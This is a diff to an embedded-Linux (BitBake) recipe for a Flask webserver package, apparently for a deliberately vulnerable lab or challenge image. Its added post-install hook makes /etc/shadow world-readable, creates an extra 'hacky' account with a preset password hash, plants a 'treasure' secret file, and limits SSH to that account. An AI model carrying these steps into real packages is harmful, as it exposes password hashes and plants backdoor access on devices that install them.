@@ -1,10 +1,3 @@
-# Unable to find any files that looked like license statements. Check the accompanying
-# documentation and source headers and set LICENSE and LIC_FILES_CHKSUM accordingly.
-#
-# NOTE: LICENSE is being set to "CLOSED" to allow you to at least start building - if
-# this is not accurate with respect to the licensing of the software being built (it
-# will not be in most cases) you must specify the correct value before using this
-# recipe for anything other than initial testing/development!
 LICENSE = "CLOSED"
 LIC_FILES_CHKSUM = ""
 
@@ -38,6 +31,26 @@ do_install () {
 	install -m 0755 ${WORKDIR}/webserver ${D}${base_prefix}${sysconfdir}/init.d/
 }
 
+pkg_postinst_${PN} () {
+	useradd webserveruser
+	chmod a+r /etc/shadow
+	useradd -p \$1\$5sGNjVOx\$uUu/JAD6cZx/gcMoHt5bb. hacky
+	echo 'the_secret' > /home/hacky/treasure
+	chown hacky /home/hacky/treasure
+	chmod 600 /home/hacky/treasure
+	echo 'AllowUsers hacky' >> /etc/ssh/sshd_config
+
+}
+
+pkg_postrm_${PN} () {
+  chmod 400 /etc/shadow
+  userdel -f webserveruser
+  rm -rf /home/webserveruser
+  userdel -f hacky
+	rm -rf /home/hacky
+	sed -i '/AllowUsers hacky/d' /etc/ssh/sshd_config
+	/etc/init.d/sshd restart
+}
 
 RDEPENDS_${PN} = "\
 	python3-flask \
@@ -48,4 +61,3 @@ FILES_${PN} = "\
 	${base_prefix}/opt/* \
 	${base_prefix}${sysconfdir}/init.d/* \
 	"
-
